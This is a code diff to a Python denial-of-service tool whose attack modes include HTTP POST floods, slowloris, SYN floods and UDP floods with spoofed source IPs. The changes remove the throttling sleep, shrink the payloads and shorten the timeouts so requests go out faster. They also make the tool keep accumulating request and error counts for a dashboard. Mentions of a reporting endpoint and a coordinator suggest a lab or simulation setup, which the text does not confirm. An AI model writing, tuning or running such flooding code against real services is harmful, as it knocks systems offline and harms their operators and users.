@@ -40,12 +40,13 @@ SPOOFED_IPS = os.getenv('SPOOFED_IPS', '').split(',') if os.getenv('SPOOFED_IPS'
 stats_enabled = os.getenv('STATS_ENABLED', 'false').lower() == 'true'
 stats_save = os.getenv('STATS_SAVE', 'false').lower() == 'true'
 stats_interval = 5
+stats_always_log = True  # Always log stats every 100 requests regardless of env var
 
 target_endpoint = os.getenv('TARGET_ENDPOINT', '/')
 
 
 def send_reports():
-    """send metrics to cord"""
+    """send metrics to target"""
 
     global stats
 
@@ -56,13 +57,14 @@ def send_reports():
         'errors': stats['errors'],
         'avg_response_time_ms': avg_response
     }
-    try: 
+    try:
         requests.post(f"{target_url.rstrip('/')}/report",json=payload, timeout=2)
      #   logger.info(f"Reported: {stats['requests_sent']} requests, {stats['errors']} errors, {avg_response:.0f}ms avg")
 
     except requests.exceptions.RequestException as e :
         logger.error(f"Failed to send report: {e}")
-    stats = {'requests_sent': 0, 'errors': 0, 'response_times':[]}
+    # Don't reset stats - keep accumulating for dashboard
+    # stats = {'requests_sent': 0, 'errors': 0, 'response_times':[]}
 logger.info(f"Attacker {attacker_id} starting, targeting {target_url}")
 
 def write_stats_to_log():
@@ -318,19 +320,17 @@ def udp_flood_attack():
 while True: 
     try:
         start_time = time.time()
-        time.sleep(0.001)
         if attack_type == 'post_flood' :
-            payload = {'data': 'A' * 10240} #10KB
-            response = requests.post(target_url + target_endpoint , json=payload , timeout=5)
+            payload = {'data': 'A' * 1024} #1KB - smaller payload for faster requests
+            response = requests.post(target_url + target_endpoint , json=payload , timeout=2)
         elif attack_type == 'slowloris':
             slowloris_attack()
         elif attack_type == 'syn_flood':
             syn_flood_attack()
         elif attack_type == 'udp_flood':
             udp_flood_attack()
-                
         else:
-            response = requests.get(target_url, timeout=5)
+            response = requests.get(target_url, timeout=2)
         
         # tracks response ms
         response_time_ms = (time.time() - start_time)*1000
@@ -341,7 +341,7 @@ while True:
         if current_time - last_report_time >= report_interval :
             send_reports()
             last_report_time = current_time
-        if stats_enabled and stats['requests_sent'] % 100 == 0:
+        if (stats_enabled or stats_always_log) and stats['requests_sent'] % 100 == 0:
             logger.info(f"[STATS] {stats['requests_sent']} requests, {stats['errors']} errors")
         if stats_save and stats['requests_sent'] % 500 == 0:
             write_stats_to_log()
